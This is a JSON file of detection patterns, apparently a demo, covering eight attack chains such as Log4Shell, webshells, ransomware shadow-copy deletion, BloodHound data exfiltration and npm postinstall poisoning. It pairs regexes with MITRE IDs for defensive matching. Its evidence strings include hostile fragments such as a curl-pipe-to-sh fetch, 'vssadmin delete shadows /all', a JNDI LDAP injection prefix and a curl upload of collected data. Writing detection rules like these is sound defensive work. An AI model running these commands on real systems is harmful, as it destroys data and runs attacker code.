@@ -1,0 +1,805 @@
+{
+  "schema_version": "demo-1.0",
+  "attack_patterns": [
+    {
+      "schema_version": "demo-1.0",
+      "case_id": "CASE-001",
+      "pattern_type": "attack_behavior_pattern",
+      "name": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令执行）",
+      "summary": "Web 参数注入 ${jndi:ldap://…} → 应用侧 JNDI 解析并回连攻击者 LDAP → 主机侧 java 进程派生子 shell 执行命令。",
+      "pattern_scope": {
+        "attack_family": "Log4j2 JNDI 注入（CVE-2021-44228）",
+        "variant_note": "由单个合成样本归纳；RMI/DNS 协议变体与二次载荷形式尚未多实例验证。"
+      },
+      "mitre": [
+        "T1190",
+        "T1059.004",
+        "T1105"
+      ],
+      "steps": [
+        {
+          "step_id": "S1",
+          "order": 1,
+          "phase": "initial_access",
+          "action_id": "log4shell_jndi_param",
+          "label": "Web 参数中的 ${jndi:…} 注入",
+          "action_regex": "(?i)\\$\\{jndi:(?:ldap|rmi|dns|iiop)://",
+          "expected_sources": [
+            "waf",
+            "web"
+          ],
+          "evidence_patterns": [
+            "${jndi:ldap://"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S2",
+          "order": 2,
+          "phase": "execution",
+          "action_id": "log4shell_app_jndi_lookup",
+          "label": "应用侧 JNDI 解析并回连",
+          "action_regex": "(?i)\\\"jndi\\\"\\s*:\\s*\\\"(?:ldap|rmi|dns)://",
+          "expected_sources": [
+            "rasp"
+          ],
+          "evidence_patterns": [
+            "{\"jndi\": \"ldap://"
+          ],
+          "generic": true
+        },
+        {
+          "step_id": "S3",
+          "order": 3,
+          "phase": "execution",
+          "action_id": "log4shell_java_child_cmd",
+          "label": "java 进程派生子 shell 执行命令",
+          "action_regex": "(?i)/bin/(?:sh|bash)\\s+-c\\s+'[^']{1,40}'.{0,80}java(?:\\.exe)?\\s+-jar",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "<== /usr/bin/java -jar"
+          ],
+          "generic": true
+        }
+      ],
+      "retrieval": {
+        "keywords": [
+          "jndi:ldap",
+          "auth-service.jar",
+          "uname -a",
+          "base64"
+        ],
+        "pattern_probes": [
+          "\\$\\{jndi:ldap://",
+          "\\\"jndi\\\"\\s*:\\s*\\\"ldap://",
+          "java(?:\\.exe)?\\s+-jar\\s+/opt/app/"
+        ]
+      },
+      "negative_and_unknown_evidence": {
+        "not_observed": [
+          "横向移动",
+          "凭据窃取",
+          "反序列化回显"
+        ],
+        "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+      },
+      "provenance": {
+        "observation_count": 1,
+        "evidence_status": "single_observation_demo",
+        "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+      }
+    },
+    {
+      "schema_version": "demo-1.0",
+      "case_id": "CASE-002",
+      "pattern_type": "attack_behavior_pattern",
+      "name": "Tomcat PUT 上传 JSP webshell + DNS C2 心跳",
+      "summary": "PUT 方法把 JSP webshell 写入上传目录 → 应用侧记录 webshell 上传与 exec 标记 → Tomcat 进程派生子 shell 执行探针 → 数小时后 DGA 风格域名突发解析。",
+      "pattern_scope": {
+        "attack_family": "Tomcat 任意文件上传（PUT）+ DNS C2",
+        "variant_note": "单样本归纳；webshell 落地路径与 C2 域名均来自该样本，变体形态未验证。"
+      },
+      "mitre": [
+        "T1190",
+        "T1505.003",
+        "T1071.004"
+      ],
+      "steps": [
+        {
+          "step_id": "S1",
+          "order": 1,
+          "phase": "initial_access",
+          "action_id": "tomcat_put_jsp_upload",
+          "label": "PUT 写入 JSP webshell",
+          "action_regex": "(?i)/uploads?/[a-z0-9_.-]{1,40}\\.jsp/?\\s+PUT\\b",
+          "expected_sources": [
+            "waf",
+            "web"
+          ],
+          "evidence_patterns": [
+            "/uploads/cmd.jsp/ PUT"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S2",
+          "order": 2,
+          "phase": "execution",
+          "action_id": "jsp_upload_rce_marker",
+          "label": "应用侧记录 webshell 上传与 exec",
+          "action_regex": "(?i)\\\"upload\\\"\\s*:\\s*\\\"[a-z0-9_.-]{1,40}\\.jsp\\\".{0,60}\\\"rce\\\"",
+          "expected_sources": [
+            "rasp"
+          ],
+          "evidence_patterns": [
+            "{\"upload\": \"cmd.jsp\", \"rce\": \"exec\"}"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S3",
+          "order": 3,
+          "phase": "execution",
+          "action_id": "tomcat_child_id_hostname",
+          "label": "Tomcat 进程派生子 shell 执行探针",
+          "action_regex": "(?i)id;\\s*hostname\\b.{0,90}catalina\\.sh",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "id; hostname"
+          ],
+          "generic": true
+        },
+        {
+          "step_id": "S4",
+          "order": 4,
+          "phase": "command_control",
+          "action_id": "dga_hex_subdomain_beacon",
+          "label": "DGA 风格子域突发解析",
+          "action_regex": "(?i)\\b[0-9a-f]{8}\\.[a-z]{6}-[0-9a-f]{4}\\.(?:net|com|org|io)\\s+A\\s+\\d",
+          "expected_sources": [
+            "dns"
+          ],
+          "evidence_patterns": [
+            "<8hex>.<6字母>-<4hex>.net A"
+          ],
+          "generic": true
+        }
+      ],
+      "retrieval": {
+        "keywords": [
+          "cmd.jsp",
+          "catalina.sh",
+          "id; hostname",
+          "vqmxld"
+        ],
+        "pattern_probes": [
+          "/uploads?/[a-z0-9_.-]+\\.jsp/?\\s+PUT",
+          "\\\"rce\\\"\\s*:\\s*\\\"exec\\\"",
+          "\\b[0-9a-f]{8}\\.[a-z]{6}-[0-9a-f]{4}\\.net\\s+A\\b"
+        ]
+      },
+      "negative_and_unknown_evidence": {
+        "not_observed": [
+          "横向移动",
+          "数据外带内容",
+          "持久化"
+        ],
+        "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+      },
+      "provenance": {
+        "observation_count": 1,
+        "evidence_status": "single_observation_demo",
+        "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+      }
+    },
+    {
+      "schema_version": "demo-1.0",
+      "case_id": "CASE-003",
+      "pattern_type": "attack_behavior_pattern",
+      "name": "Windows 计划任务持久化（schtasks 周期拉起载荷）",
+      "summary": "调度接口被注入 schtasks 命令 → 应用侧记录 cmd_inject=schtasks → 主机侧创建周期计划任务执行 C:\\Windows\\Temp 下的载荷。",
+      "pattern_scope": {
+        "attack_family": "Windows 计划任务持久化",
+        "variant_note": "由单个合成样本归纳；任务名/触发间隔/载荷路径均来自该样本，未验证其它调度器变体。"
+      },
+      "mitre": [
+        "T1053.005",
+        "T1059.003"
+      ],
+      "steps": [
+        {
+          "step_id": "S1",
+          "order": 1,
+          "phase": "initial_access",
+          "action_id": "scheduler_cmd_inject",
+          "label": "调度接口命令注入（cmd=schtasks）",
+          "action_regex": "(?i)cmd=schtasks\\s+/create",
+          "expected_sources": [
+            "waf"
+          ],
+          "evidence_patterns": [
+            "cmd=schtasks /create"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S2",
+          "order": 2,
+          "phase": "execution",
+          "action_id": "scheduler_cmd_inject_rasp",
+          "label": "应用侧记录 cmd_inject=schtasks",
+          "action_regex": "(?i)\\\"cmd_inject\\\"\\s*:\\s*\\\"schtasks",
+          "expected_sources": [
+            "rasp"
+          ],
+          "evidence_patterns": [
+            "{\"cmd_inject\": \"schtasks"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S3",
+          "order": 3,
+          "phase": "persistence",
+          "action_id": "schtasks_interval_task",
+          "label": "创建周期计划任务执行载荷",
+          "action_regex": "(?i)schtasks(?:\\.exe)?\\s+/create.{0,60}/sc\\s+minute",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "/sc minute"
+          ],
+          "generic": false
+        }
+      ],
+      "retrieval": {
+        "keywords": [
+          "schtasks /create",
+          "/api/v1/scheduler/run",
+          "cmd_inject"
+        ],
+        "pattern_probes": [
+          "schtasks\\s+/create",
+          "\\\"cmd_inject\\\"\\s*:\\s*\\\"schtasks",
+          "/api/v1/scheduler/run"
+        ]
+      },
+      "negative_and_unknown_evidence": {
+        "not_observed": [
+          "横向移动",
+          "凭据窃取",
+          "载荷内容"
+        ],
+        "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+      },
+      "provenance": {
+        "observation_count": 1,
+        "evidence_status": "single_observation_demo",
+        "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+      }
+    },
+    {
+      "schema_version": "demo-1.0",
+      "case_id": "CASE-004",
+      "pattern_type": "attack_behavior_pattern",
+      "name": "Laravel Ignition 反序列化 RCE + cron 持久化",
+      "summary": "请求 _ignition/execute-solution 触发 phar 反序列化 → 应用侧记录 phar:// 载荷 → PHP-FPM 派生子 shell 执行 id → 追加 crontab 定时回连。",
+      "pattern_scope": {
+        "attack_family": "Laravel Ignition 反序列化（CVE-2021-3129）",
+        "variant_note": "单样本归纳；phar 落地路径与持久化命令来自该样本。"
+      },
+      "mitre": [
+        "T1190",
+        "T1059.004",
+        "T1053.003"
+      ],
+      "steps": [
+        {
+          "step_id": "S1",
+          "order": 1,
+          "phase": "initial_access",
+          "action_id": "laravel_ignition_execute_solution",
+          "label": "_ignition/execute-solution 触发",
+          "action_regex": "(?i)_ignition/execute-solution",
+          "expected_sources": [
+            "waf",
+            "web"
+          ],
+          "evidence_patterns": [
+            "_ignition/execute-solution"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S2",
+          "order": 2,
+          "phase": "execution",
+          "action_id": "ignition_phar_deserialization",
+          "label": "应用侧 phar:// 反序列化载荷",
+          "action_regex": "(?i)\\\"viewfile\\\"\\s*:\\s*\\\"phar://",
+          "expected_sources": [
+            "rasp"
+          ],
+          "evidence_patterns": [
+            "{\"viewFile\": \"phar://"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S3",
+          "order": 3,
+          "phase": "execution",
+          "action_id": "php_fpm_child_id",
+          "label": "PHP-FPM 派生子 shell 执行命令",
+          "action_regex": "(?i)<==\\s*/bin/(?:sh|bash|dash)\\s+-c\\s+'id'.{0,40}php-fpm",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "<== /bin/sh -c 'id' <== php-fpm"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S4",
+          "order": 4,
+          "phase": "persistence",
+          "action_id": "cron_persistence_append",
+          "label": "追加 crontab 定时回连",
+          "action_regex": "(?i)>>\\s*/var/spool/cron/root|\\(\\s*crontab\\s+-l",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            ">> /var/spool/cron/root"
+          ],
+          "generic": true
+        }
+      ],
+      "retrieval": {
+        "keywords": [
+          "_ignition",
+          "phar://",
+          "execute-solution",
+          "php-fpm",
+          "/var/spool/cron/root"
+        ],
+        "pattern_probes": [
+          "_ignition/execute-solution",
+          "phar:///tmp/",
+          ">>\\s*/var/spool/cron/root"
+        ]
+      },
+      "negative_and_unknown_evidence": {
+        "not_observed": [
+          "横向移动",
+          "凭据窃取"
+        ],
+        "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+      },
+      "provenance": {
+        "observation_count": 1,
+        "evidence_status": "single_observation_demo",
+        "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+      }
+    },
+    {
+      "schema_version": "demo-1.0",
+      "case_id": "CASE-005",
+      "pattern_type": "attack_behavior_pattern",
+      "name": "勒索式数据破坏：删卷影 + 批量加密",
+      "summary": "上传接口落地 WebShell → 主机侧用 cipher 批量加密共享目录 → 删除全部卷影副本破坏恢复能力（先加密后破坏，与样本时间序一致）。",
+      "pattern_scope": {
+        "attack_family": "勒索与数据破坏（加密 + 恢复能力破坏）",
+        "variant_note": "单样本归纳；样本内部顺序为「加密→删卷影」，与多数勒索链顺序相反，已按观测记录。"
+      },
+      "mitre": [
+        "T1486",
+        "T1490",
+        "T1505.003"
+      ],
+      "steps": [
+        {
+          "step_id": "S1",
+          "order": 1,
+          "phase": "persistence",
+          "action_id": "webshell_upload_action",
+          "label": "上传接口落地 WebShell",
+          "action_regex": "(?i)wp-admin/admin-ajax\\.php\\?action=upload|\\\"upload\\\"\\s*:\\s*\\\"[a-z0-9_.-]{1,40}\\.php\\\"",
+          "expected_sources": [
+            "rasp"
+          ],
+          "evidence_patterns": [
+            "action=upload"
+          ],
+          "generic": true
+        },
+        {
+          "step_id": "S2",
+          "order": 2,
+          "phase": "impact",
+          "action_id": "cipher_efs_batch_encrypt",
+          "label": "cipher 批量加密目录",
+          "action_regex": "(?i)(?:^|\\s)cipher(?:\\.exe)?\\s+/e\\s+/s:",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "cipher /e /s:"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S3",
+          "order": 3,
+          "phase": "impact",
+          "action_id": "vssadmin_delete_shadows_all",
+          "label": "删除全部卷影副本",
+          "action_regex": "(?i)vssadmin(?:\\.exe)?\\s+delete\\s+shadows\\s+/all",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "vssadmin delete shadows /all"
+          ],
+          "generic": false
+        }
+      ],
+      "retrieval": {
+        "keywords": [
+          "cipher /e",
+          "vssadmin delete shadows",
+          "action=upload"
+        ],
+        "pattern_probes": [
+          "cipher(?:\\.exe)?\\s+/e\\s+/s:",
+          "vssadmin(?:\\.exe)?\\s+delete\\s+shadows\\s+/all",
+          "action=upload"
+        ]
+      },
+      "negative_and_unknown_evidence": {
+        "not_observed": [
+          "勒索信",
+          "横向扩散",
+          "备份服务器删除"
+        ],
+        "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+      },
+      "provenance": {
+        "observation_count": 1,
+        "evidence_status": "single_observation_demo",
+        "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+      }
+    },
+    {
+      "schema_version": "demo-1.0",
+      "case_id": "CASE-006",
+      "pattern_type": "attack_behavior_pattern",
+      "name": "域内侦察：BloodHound 图谱采集与外传",
+      "summary": "主机侧运行 SharpHound 全量采集 → 压缩采集结果 → 上传到攻击者地址，为后续 Kerberoasting/DCSync 选路。",
+      "pattern_scope": {
+        "attack_family": "AD 域内侦察（BloodHound）",
+        "variant_note": "由单个合成样本归纳；采集参数与上传地址来自该样本，未覆盖其它采集器。"
+      },
+      "mitre": [
+        "T1087.002",
+        "T1069.002",
+        "T1560.001"
+      ],
+      "steps": [
+        {
+          "step_id": "S1",
+          "order": 1,
+          "phase": "discovery",
+          "action_id": "sharphound_collect_all",
+          "label": "SharpHound 全量采集",
+          "action_regex": "(?i)sharphound(?:\\.exe)?\\s+-c\\s+all",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "SharpHound.exe -c All"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S2",
+          "order": 2,
+          "phase": "collection",
+          "action_id": "archive_collect_result",
+          "label": "压缩采集结果",
+          "action_regex": "(?i)compress-archive.{0,80}bh_\\*",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "Compress-Archive ... bh_*.json"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S3",
+          "order": 3,
+          "phase": "exfiltration",
+          "action_id": "upload_collected_zip",
+          "label": "上传采集压缩包",
+          "action_regex": "(?i)curl(?:\\.exe)?\\s+-t\\s+\\S{1,40}\\.zip\\s+http://",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "curl.exe -T bh.zip"
+          ],
+          "generic": false
+        }
+      ],
+      "retrieval": {
+        "keywords": [
+          "sharphound.exe",
+          "compress-archive",
+          "bh.zip",
+          "corp\\jdoe"
+        ],
+        "pattern_probes": [
+          "sharphound(?:\\.exe)?\\s+-c\\s+all",
+          "compress-archive.{0,80}bh_",
+          "curl(?:\\.exe)?\\s+-t\\s+\\S{1,40}\\.zip"
+        ]
+      },
+      "negative_and_unknown_evidence": {
+        "not_observed": [
+          "Kerberoasting",
+          "DCSync",
+          "横向移动"
+        ],
+        "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+      },
+      "provenance": {
+        "observation_count": 1,
+        "evidence_status": "single_observation_demo",
+        "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+      }
+    },
+    {
+      "schema_version": "demo-1.0",
+      "case_id": "CASE-007",
+      "pattern_type": "attack_behavior_pattern",
+      "name": "供应链投毒：npm postinstall 钩子执行远程脚本",
+      "summary": "CI 流水线参数触发依赖安装 → 应用侧记录 postinstall 钩子派生 sh → 主机侧 curl 远程脚本并管道执行。",
+      "pattern_scope": {
+        "attack_family": "供应链 / CI 依赖投毒",
+        "variant_note": "单样本归纳；包名与钩子实现来自该样本，其它包管理器生态未验证。"
+      },
+      "mitre": [
+        "T1195.002",
+        "T1059.004"
+      ],
+      "steps": [
+        {
+          "step_id": "S1",
+          "order": 1,
+          "phase": "initial_access",
+          "action_id": "ci_pipeline_npm_postinstall",
+          "label": "CI 流水线触发依赖安装",
+          "action_regex": "(?i)(?:hook=postinstall|/api/v\\d/pipeline/run)",
+          "expected_sources": [
+            "waf",
+            "web"
+          ],
+          "evidence_patterns": [
+            "hook=postinstall"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S2",
+          "order": 2,
+          "phase": "execution",
+          "action_id": "npm_lifecycle_postinstall_spawn",
+          "label": "应用侧 postinstall 派生 shell",
+          "action_regex": "(?i)\\\"npm_lifecycle\\\"\\s*:\\s*\\\"postinstall\\\"",
+          "expected_sources": [
+            "rasp"
+          ],
+          "evidence_patterns": [
+            "{\"npm_lifecycle\": \"postinstall\"}"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S3",
+          "order": 3,
+          "phase": "execution",
+          "action_id": "npm_hook_remote_shell",
+          "label": "钩子拉取远程脚本并执行",
+          "action_regex": "(?i)curl\\s+\\S{1,60}/p\\.sh\\|sh",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "curl 10.20.5.19/p.sh|sh"
+          ],
+          "generic": false
+        }
+      ],
+      "retrieval": {
+        "keywords": [
+          "postinstall",
+          "pipeline/run",
+          "install.js"
+        ],
+        "pattern_probes": [
+          "hook=postinstall",
+          "\\\"npm_lifecycle\\\"\\s*:\\s*\\\"postinstall\\\"",
+          "curl\\s+\\d{1,3}(?:\\.\\d{1,3}){3}/p\\.sh\\|sh"
+        ]
+      },
+      "negative_and_unknown_evidence": {
+        "not_observed": [
+          "凭据外带",
+          "制品投毒"
+        ],
+        "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+      },
+      "provenance": {
+        "observation_count": 1,
+        "evidence_status": "single_observation_demo",
+        "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+      }
+    },
+    {
+      "schema_version": "demo-1.0",
+      "case_id": "CASE-008",
+      "pattern_type": "attack_behavior_pattern",
+      "name": "Exchange ProxyLogon 风格利用链",
+      "summary": "SSRF 入口 → IIS 进程执行 → ASPX webshell → PrintSpoofer 提权 → 服务持久化 → DNS TXT 外传。",
+      "pattern_scope": {
+        "attack_family": "Exchange ProxyLogon 风格利用",
+        "variant_note": "这是从单次样例归纳的模式；步骤顺序和可选性尚未由多实例验证。"
+      },
+      "mitre": [
+        "T1190",
+        "T1059.003",
+        "T1505.003",
+        "T1068",
+        "T1543.003",
+        "T1048.003"
+      ],
+      "steps": [
+        {
+          "step_id": "S1",
+          "order": 1,
+          "phase": "initial_access",
+          "action_id": "exch_proxylogon_ssrf",
+          "label": "X-BEResource SSRF 入口",
+          "action_regex": "(?i)X-BEResource\\s*=|/ecp/[A-Za-z0-9]+/ecp\\.aspx",
+          "expected_sources": [
+            "waf",
+            "web"
+          ],
+          "evidence_patterns": [
+            "X-BEResource=",
+            "/ecp/<id>/ecp.aspx"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S2",
+          "order": 2,
+          "phase": "execution",
+          "action_id": "w3wp_spawn_cmd",
+          "label": "w3wp.exe 派生 cmd.exe",
+          "action_regex": "(?i)w3wp\\.exe.{0,160}?(?:cmd|powershell)(?:\\.exe)?",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "w3wp.exe → cmd.exe"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S3",
+          "order": 3,
+          "phase": "execution",
+          "action_id": "aspx_shell_path",
+          "label": "aspnet_client 下 ASPX webshell",
+          "action_regex": "(?i)/aspnet_client/[A-Za-z0-9_./-]+\\.aspx",
+          "expected_sources": [
+            "web",
+            "rasp"
+          ],
+          "evidence_patterns": [
+            "/aspnet_client/... .aspx"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S4",
+          "order": 4,
+          "phase": "privilege",
+          "action_id": "printspoofer_priv",
+          "label": "PrintSpoofer / SeImpersonate 提权",
+          "action_regex": "(?i)PrintSpoofer(?:\\.exe)?|SeImpersonatePrivilege",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "PrintSpoofer.exe",
+            "SeImpersonatePrivilege"
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S5",
+          "order": 5,
+          "phase": "persistence",
+          "action_id": "sc_create_service",
+          "label": "sc.exe create 注册服务",
+          "action_regex": "(?i)sc(?:\\.exe)?\\s+create\\s+\\w+.{0,100}?binPath=",
+          "expected_sources": [
+            "hids"
+          ],
+          "evidence_patterns": [
+            "sc.exe create ... binPath="
+          ],
+          "generic": false
+        },
+        {
+          "step_id": "S6",
+          "order": 6,
+          "phase": "exfil",
+          "action_id": "dns_b64_label_beacon",
+          "label": "长标签 DNS TXT beacon",
+          "action_regex": "(?i)\\b[A-Za-z0-9+/=]{18,}\\.[A-Za-z0-9-]+\\.[A-Za-z]{2,}\\s+TXT\\b",
+          "expected_sources": [
+            "dns"
+          ],
+          "evidence_patterns": [
+            "长 base64 标签",
+            "TXT 查询"
+          ],
+          "generic": false
+        }
+      ],
+      "retrieval": {
+        "keywords": [
+          "x-beresource",
+          "proxylogon",
+          "ecp.aspx",
+          "aspnet_client",
+          "webshell",
+          "printspoofer",
+          "seimpersonate",
+          "sc create",
+          "dns txt"
+        ],
+        "pattern_probes": [
+          "x-beresource=",
+          "/ecp/[a-z0-9]+/ecp\\.aspx",
+          "w3wp\\.exe.{0,120}?cmd\\.exe",
+          "/aspnet_client/[A-Za-z0-9_/]+\\.aspx",
+          "printspoofer(?:\\.exe)?",
+          "sc(?:\\.exe)?\\s+create\\s+\\w+\\s+binpath="
+        ]
+      },
+      "negative_and_unknown_evidence": {
+        "not_observed": [
+          "横向移动",
+          "凭据窃取"
+        ],
+        "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+      },
+      "provenance": {
+        "observation_count": 1,
+        "evidence_status": "single_observation_demo",
+        "observation_count_note": "Aggregate count of real observations; raw case content and identifiers are stored in CSV files."
+      }
+    }
+  ]
+}
